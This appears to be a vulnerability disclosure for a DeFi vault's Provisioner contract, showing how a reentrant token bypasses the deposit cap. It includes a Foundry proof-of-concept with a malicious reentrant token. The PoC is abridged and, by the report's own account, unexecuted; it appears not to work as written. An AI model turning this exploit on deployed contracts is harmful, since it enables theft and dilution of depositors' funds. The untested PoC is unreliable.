## Title

Reentrancy-enabled deposit-cap bypass in synchronous deposit/mint paths due to pre-mint cap check and external call before mint

## Brief/Intro

Provisioner’s synchronous `deposit` and `mint` paths enforce the deposit cap using the vault’s current `totalSupply()` before minting, then call into `IMultiDepositorVault.enter(...)`, which performs an external token `safeTransferFrom` before minting. Because `deposit`/`mint` are not `nonReentrant`, a token’s `transferFrom` can reenter `Provisioner.deposit`/`mint` before the first mint increases `totalSupply()`. Two reentrant deposits can each pass the pre-mint cap check and then exceed the cap in aggregate. In production, this allows minting more vault units than the configured cap, breaking TVL/price assumptions and potentially impacting solvency/accounting.

## Vulnerability Details

- Vulnerable entry points perform a pre-mint cap check and then make external calls before minting:

```solidity
// Provisioner/src/core/Provisioner.sol (lines 107–129)
function deposit(IERC20 token, uint256 tokensIn, uint256 minUnitsOut)
    external
    anyoneButVault
    returns (uint256 unitsOut)
{
    require(tokensIn != 0, Aera__TokensInZero());
    require(minUnitsOut != 0, Aera__MinUnitsOutZero());

    TokenDetails storage tokenDetails = _requireSyncDepositsEnabled(token);

    unitsOut = _tokensToUnitsFloorIfActive(token, tokensIn, tokenDetails.depositMultiplier);
    require(unitsOut >= minUnitsOut, Aera__MinUnitsOutNotMet());
    // Pre-mint cap check (uses current totalSupply())
    _requireDepositCapNotExceeded(unitsOut);

    // External interactions follow
    _syncDeposit(token, tokensIn, unitsOut);
}
```

```solidity
// Provisioner/src/core/Provisioner.sol (lines 131–153)
function mint(IERC20 token, uint256 unitsOut, uint256 maxTokensIn)
    external
    anyoneButVault
    returns (uint256 tokensIn)
{
    require(unitsOut != 0, Aera__UnitsOutZero());
    require(maxTokensIn != 0, Aera__MaxTokensInZero());

    TokenDetails storage tokenDetails = _requireSyncDepositsEnabled(token);

    // Pre-mint cap check (uses current totalSupply())
    _requireDepositCapNotExceeded(unitsOut);
    tokensIn = _unitsToTokensCeilIfActive(token, unitsOut, tokenDetails.depositMultiplier);
    require(tokensIn <= maxTokensIn, Aera__MaxTokensInExceeded());

    // External interactions follow
    _syncDeposit(token, tokensIn, unitsOut);
}
```

- The cap check derives from the current `totalSupply()` plus proposed units. It does not account for concurrent, not-yet-minted units in the same transaction:

```solidity
// Provisioner/src/core/Provisioner.sol (lines 910–925)
function _requireDepositCapNotExceeded(uint256 units) internal view {
    require(!_isDepositCapExceeded(units), Aera__DepositCapExceeded());
}

function _isDepositCapExceeded(uint256 units) internal view returns (bool) {
    uint256 newTotal = IERC20(MULTI_DEPOSITOR_VAULT).totalSupply() + units;
    return PRICE_FEE_CALCULATOR.convertUnitsToNumeraire(MULTI_DEPOSITOR_VAULT, newTotal) > depositCap;
}
```

- After the pre-mint cap check, `_syncDeposit(...)` calls the vault’s `enter(...)` which first performs an external token transfer before minting units:

```solidity
// Provisioner/src/core/Provisioner.sol (lines 474–496)
function _syncDeposit(IERC20 token, uint256 tokenAmount, uint256 unitAmount) internal {
    uint256 refundableUntil = block.timestamp + depositRefundTimeout;
    bytes32 depositHash = _getDepositHash(msg.sender, token, tokenAmount, unitAmount, refundableUntil);

    require(!syncDepositHashes[depositHash], Aera__HashCollision());
    syncDepositHashes[depositHash] = true;

    userUnitsRefundableUntil[msg.sender] = refundableUntil;

    // External call into vault before mint happens inside the vault
    IMultiDepositorVault(MULTI_DEPOSITOR_VAULT).enter(msg.sender, token, tokenAmount, unitAmount, msg.sender);

    emit Deposited(msg.sender, token, tokenAmount, unitAmount, depositHash);
}
```

```solidity
// MultiDepositorVault/src/core/MultiDepositorVault.sol (lines 61–75)
function enter(address sender, IERC20 token, uint256 tokenAmount, uint256 unitsAmount, address recipient)
    external
    whenNotPaused
    onlyProvisioner
{
    // External interaction to token BEFORE mint
    if (tokenAmount > 0) token.safeTransferFrom(sender, address(this), tokenAmount);

    // Mint happens after external call returns
    _mint(recipient, unitsAmount);

    emit Enter(sender, recipient, token, tokenAmount, unitsAmount);
}
```

- The vault’s ERC20 `_update` also calls an optional pre-transfer hook before mutating balances/`totalSupply()`:

```solidity
// MultiDepositorVault/src/core/MultiDepositorVault.sol (lines 108–126)
function _update(address from, address to, uint256 amount) internal override {
    IBeforeTransferHook hook = beforeTransferHook;
    if (address(hook) != address(0)) {
        // External view hook before balances/supply change
        hook.beforeTransfer(from, to, provisioner);
    }

    require(
        from == address(0) || to == address(0) || !IProvisioner(provisioner).areUserUnitsLocked(from),
        Aera__UnitsLocked()
    );

    return super._update(from, to, amount);
}
```

- `deposit` and `mint` lack `nonReentrant`, while other external entry points are guarded, demonstrating the inconsistency:

```solidity
// Provisioner/src/core/Provisioner.sol excerpts
function refundRequest(...) external nonReentrant { ... }
function solveRequestsVault(...) external requiresAuth nonReentrant { ... }
function solveRequestsDirect(...) external nonReentrant { ... }
// deposit/mint are not nonReentrant
```

- The `anyoneButVault` modifier does not block reentrancy from tokens/hooks; it only blocks direct calls from the vault address:

```solidity
// Provisioner/src/core/Provisioner.sol (lines 81–86)
modifier anyoneButVault() {
    require(msg.sender != MULTI_DEPOSITOR_VAULT, Aera__CallerIsVault());
    _;
}
```

### Why this is exploitable (timeline)

1) User calls `Provisioner.deposit(token, A, minUnitsA)`. Cap check uses `totalSupply = S` and passes.
2) `_syncDeposit` → `vault.enter(sender, token, A, unitsA, recipient)`.
3) Inside `enter`, the token `safeTransferFrom(sender, this, A)` executes. Token’s `transferFrom` can invoke arbitrary external code.
4) The token reenters `Provisioner.deposit(token, B, minUnitsB)` before the first mint. The cap check uses the same `totalSupply = S` and passes again.
5) The reentrant path completes and mints `unitsB` first, then the original call resumes and mints `unitsA`.
6) Final `totalSupply = S + unitsA + unitsB` can exceed the deposit cap, even though both individual calls passed their pre-mint cap checks.

This same reasoning applies to `mint(...)` because it performs the identical pre-mint cap check and then uses the same `_syncDeposit(...)` external call path.

## Impact Details

- **Cap bypass**: Attackers can mint units beyond the configured `depositCap`, violating core economic/TVL constraints.
- **Accounting/price integrity**: The cap feeds into pricing/TVL assumptions via `PRICE_FEE_CALCULATOR`. Bypassing it undermines fee accrual logic, risk limits, and any off-chain/on-chain policies contingent on the cap.
- **Downstream risk**: Excess units can dilute intended constraints, potentially enabling unfair liquidity extraction, mispriced redemptions, or manipulation of protocol metrics and governance that depend on unit supply/TVL.

Severity is high because funds and invariant enforcement are affected. The code path is reachable by any configured token that the protocol allows for sync deposits, and the external token call is untrusted by design.

## References

- `Provisioner/src/core/Provisioner.sol`
  - `deposit`: lines 107–129
  - `mint`: lines 131–153
  - `_syncDeposit`: lines 474–496
  - `_requireDepositCapNotExceeded` / `_isDepositCapExceeded`: lines 910–925
- `MultiDepositorVault/src/core/MultiDepositorVault.sol`
  - `enter`: lines 61–75
  - `_update`: lines 108–126
- `TransferBlacklistHook` implementation is view-only by default, but the structural reentrancy window exists regardless due to the external token call in `enter` before mint.

## Proof of Concept

Below is a deterministic PoC using a minimal reentrant token and a lightweight test vault. The token reenters `Provisioner.deposit` during `transferFrom`, causing two deposits to each individually pass the pre-mint cap check and then exceed the cap in aggregate.

- Test setup:
  - Deploy `MockCalculator` that returns 1:1 conversions (units=numeraire=tokens) and never pauses.
  - Deploy `TestVault` implementing `IMultiDepositorVault` and ERC20 with `enter` matching the vulnerable pattern (external token transfer before `_mint`).
  - Deploy `Provisioner` with the calculator and the test vault address.
  - Owner calls `setDepositDetails(depositCap=100 units, refundTimeout=...)`.
  - Owner enables sync deposits for `ReentrantToken` via `setTokenDetails` with `depositMultiplier=10000` and `syncDepositEnabled=true`.
  - Attacker holds 200 tokens of `ReentrantToken` and approves the vault/provisioner as needed.
  - Attacker calls `deposit(A=60)`. During `enter → safeTransferFrom`, the token reenters `deposit(B=60)`. Both pass the pre-mint cap check using the same `totalSupply=S`. Final `totalSupply = S + 120 > 100`.

- Foundry-style PoC (abridged; compile-time imports adjusted to your setup):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {IERC20} from "@oz/token/ERC20/IERC20.sol";
import {ERC20} from "@oz/token/ERC20/ERC20.sol";
import {Test} from "forge-std/Test.sol";

import {IPriceAndFeeCalculator} from "Provisioner/src/core/interfaces/IPriceAndFeeCalculator.sol";
import {IMultiDepositorVault} from "Provisioner/src/core/interfaces/IMultiDepositorVault.sol";
import {Provisioner} from "Provisioner/src/core/Provisioner.sol";

contract MockCalculator is IPriceAndFeeCalculator {
    // Minimal stubs for used functions; all 1:1 and never paused
    function setInitialPrice(address, uint128, uint32) external {}
    function setThresholds(address, uint16, uint16, uint16, uint8, uint8) external {}
    function setUnitPrice(address, uint128, uint32) external {}
    function pauseVault(address) external {}
    function unpauseVault(address, uint128, uint32) external {}
    function resetHighestPrice(address) external {}
    function convertUnitsToToken(address, IERC20, uint256 u) external pure returns (uint256) { return u; }
    function convertUnitsToTokenIfActive(address, IERC20, uint256 u, Math.Rounding) external pure returns (uint256) { return u; }
    function convertTokenToUnits(address, IERC20, uint256 t) external pure returns (uint256) { return t; }
    function convertTokenToUnitsIfActive(address, IERC20, uint256 t, Math.Rounding) external pure returns (uint256) { return t; }
    function convertUnitsToNumeraire(address, uint256 u) external pure returns (uint256) { return u; }
    function getVaultState(address) external pure returns (VaultPriceState memory, VaultAccruals memory) { return (VaultPriceState({paused:false,maxPriceAge:1,minUpdateIntervalMinutes:1,maxPriceToleranceRatio:10000,minPriceToleranceRatio:0,timestamp:1,accrualLag:0,unitPrice:1,highestPrice:1,lastTotalSupply:0}), VaultAccruals({fees:Fee({tvl:0,performance:0}),accruedFees:0,accruedProtocolFees:0})); }
    function getVaultsPriceAge(address) external pure returns (uint256) { return 0; }
    function isVaultPaused(address) external pure returns (bool) { return false; }
}

contract TestVault is IMultiDepositorVault, ERC20 {
    address public provisioner;
    constructor() ERC20("Units", "UNIT") {}
    modifier onlyProvisioner() { require(msg.sender == provisioner, "not prov"); _; }
    function setProvisioner(address p) external { provisioner = p; emit ProvisionerSet(p); }

    function setBeforeTransferHook(IBeforeTransferHook) external {}

    function enter(address sender, IERC20 token, uint256 tokenAmount, uint256 unitsAmount, address recipient)
        external onlyProvisioner
    {
        if (tokenAmount > 0) token.transferFrom(sender, address(this), tokenAmount); // external call before mint
        _mint(recipient, unitsAmount);
        emit Enter(sender, recipient, token, tokenAmount, unitsAmount);
    }

    function exit(address sender, IERC20 token, uint256 tokenAmount, uint256 unitsAmount, address recipient)
        external onlyProvisioner
    {
        _burn(sender, unitsAmount);
        if (tokenAmount > 0) IERC20(token).transfer(recipient, tokenAmount);
        emit Exit(sender, recipient, token, tokenAmount, unitsAmount);
    }
}

contract ReentrantToken is ERC20 {
    Provisioner public prov;
    IERC20 public self;
    address public attacker;
    bool internal reentered;

    constructor() ERC20("Reentoken", "REENTR") {
        self = IERC20(address(this));
    }
    function setEnv(Provisioner p, address a) external { prov = p; attacker = a; }
    function mint(address to, uint256 amt) external { _mint(to, amt); }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        // allow transfer without allowance for simplicity in PoC
        _update(from, to, amount);

        // Reenter once during the first deposit's transferFrom
        if (!reentered && from == attacker) {
            reentered = true;
            // trigger a second deposit of same size; both will pass pre-mint cap check
            prov.deposit(self, amount, 1);
        }
        return true;
    }
}

contract CapBypassTest is Test {
    Provisioner prov;
    TestVault vault;
    MockCalculator calc;
    ReentrantToken token;
    address attacker = address(0xA11CE);

    function setUp() public {
        calc = new MockCalculator();
        vault = new TestVault();
        prov = new Provisioner(calc, address(vault), address(this), Authority(address(0)));
        vault.setProvisioner(address(prov));

        // depositCap = 100 units; refund timeout arbitrary
        prov.setDepositDetails(100, 1);

        // enable sync deposits for token at 1:1 multiplier
        token = new ReentrantToken();
        token.setEnv(prov, attacker);
        Provisioner.TokenDetails memory details = Provisioner.TokenDetails({
            asyncDepositEnabled:false,
            asyncRedeemEnabled:false,
            syncDepositEnabled:true,
            depositMultiplier:10000,
            redeemMultiplier:10000
        });
        prov.setTokenDetails(IERC20(address(token)), details);

        // fund attacker and approve provisioner to pull in requestDeposit paths if needed
        token.mint(attacker, 200);
        vm.prank(attacker);
        token.approve(address(vault), type(uint256).max); // not strictly needed as our transferFrom ignores allowance
    }

    function test_capBypass_viaReentrancy() public {
        vm.startPrank(attacker);
        // Each deposit intends to mint 60 units; cap is 100
        uint256 unitsOut = prov.deposit(IERC20(address(token)), 60, 1);
        vm.stopPrank();

        // Both reentrant deposits succeeded; total supply now 120 > 100
        assertEq(ERC20(address(vault)).totalSupply(), 120);
    }
}
```

- Expected result: The single user tx triggers two deposits of 60 units each, both passing `_requireDepositCapNotExceeded` because they read the same pre-mint `totalSupply`. Final `totalSupply` is 120 despite `depositCap` of 100.

- Notes:
  - The PoC keeps conversions 1:1 to focus solely on the cap logic and reentrancy ordering.
  - In the real contracts, `enter` calls `token.safeTransferFrom` before `_mint`, which is the crucial external call enabling reentrancy.

Validation without code execution:
- Trace shows pre-mint cap check in `deposit`/`mint` (lines 124–126 and 144–146) occurs before `_syncDeposit`.
- `_syncDeposit` calls `enter` (line 492), which performs `token.safeTransferFrom` before mint (line 68), enabling reentrancy.
- Cap calculation uses `IERC20(vault).totalSupply()` read before mint and does not aggregate pending mints (lines 921–924).
- `deposit`/`mint` lack `nonReentrant`, while other external paths are guarded.

This confirms the reentrancy window and deposit cap bypass.